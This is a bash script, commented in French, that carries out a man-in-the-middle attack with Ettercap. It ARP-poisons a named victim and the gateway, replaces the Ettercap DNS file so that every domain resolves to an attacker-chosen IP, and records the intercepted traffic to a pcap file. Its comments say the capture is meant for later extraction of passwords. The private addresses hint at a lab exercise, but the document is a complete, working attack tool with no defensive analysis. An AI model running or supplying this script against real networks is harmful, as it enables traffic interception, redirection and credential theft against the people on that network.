#!/bin/bash
# Script de redirection DNS via ARP spoofing avec capture de trafic pour écoute de mots de passe
# Redirige toutes les requêtes DNS de la victime (10.0.26.66)
# vers l'IP 10.0.26.181, en se plaçant entre la victime et la passerelle (10.0.26.254).
#
# De plus, le script lance Ettercap en mode texte avec enregistrement du trafic
# dans un fichier de capture (/tmp/capture.pcap) afin d'analyser ultérieurement les identifiants.
#
# Usage : sudo ./spoof_redirection.sh <interface>
# Exemple : sudo ./spoof_redirection.sh eth0

if [ "$EUID" -ne 0 ]; then
    echo "Ce script doit être exécuté en tant que root."
    exit 1
fi

# Vérifier la présence d'une interface en paramètre
if [ -z "$1" ]; then
    echo "Usage : $0 <interface réseau>"
    exit 1
fi

INTERFACE="$1"
GATEWAY="10.0.26.254"
VICTIME="10.0.26.66"
REDIR_IP="10.0.26.181"

# Chemin du fichier DNS d'Ettercap (à adapter si nécessaire)
ETTER_DNS="/etc/ettercap/etter.dns"
BACKUP_DNS="/etc/ettercap/etter.dns.bak"
TEMP_DNS="/tmp/etter.dns"
CAPTURE_FILE="/tmp/capture.pcap"

echo "[*] Création d'un fichier DNS personnalisé..."
# Ce fichier force la résolution de tous les domaines vers REDIR_IP.
cat <<EOF > "$TEMP_DNS"
* A $REDIR_IP
EOF

# Sauvegarder le fichier DNS original s'il n'a pas encore été sauvegardé
if [ ! -f "$BACKUP_DNS" ]; then
    echo "[*] Sauvegarde du fichier DNS original..."
    cp "$ETTER_DNS" "$BACKUP_DNS"
fi

# Copier notre fichier DNS temporaire dans le dossier d'Ettercap
echo "[*] Mise en place du DNS spoofing (toutes les résolutions pointeront vers $REDIR_IP)..."
cp "$TEMP_DNS" "$ETTER_DNS"

echo "[*] Lancement d'Ettercap en mode texte (ARP poisoning) avec capture de trafic..."
echo "    Passerelle : $GATEWAY"
echo "    Victime    : $VICTIME"
echo "    Interface  : $INTERFACE"
echo "    Fichier de capture : $CAPTURE_FILE"
echo "Appuyez sur Ctrl+C pour arrêter l'attaque."

# Lancer Ettercap en mode texte :
# - -T active le mode texte
# - -i spécifie l'interface réseau
# - -M arp:remote active l'attaque ARP poisoning en mode remote
# - -w enregistre le trafic dans le fichier de capture
sudo ettercap -T -i "$INTERFACE" -w "$CAPTURE_FILE" -M arp:remote /$GATEWAY/ /$VICTIME/

# À l'arrêt de l'attaque, restaurer le fichier DNS original
echo "[*] Restauration du fichier DNS original..."
cp "$BACKUP_DNS" "$ETTER_DNS"
rm -f "$TEMP_DNS"

echo "[*] Attaque terminée. La configuration DNS a été restaurée."
echo "[*] Le trafic capturé est disponible dans : $CAPTURE_FILE"
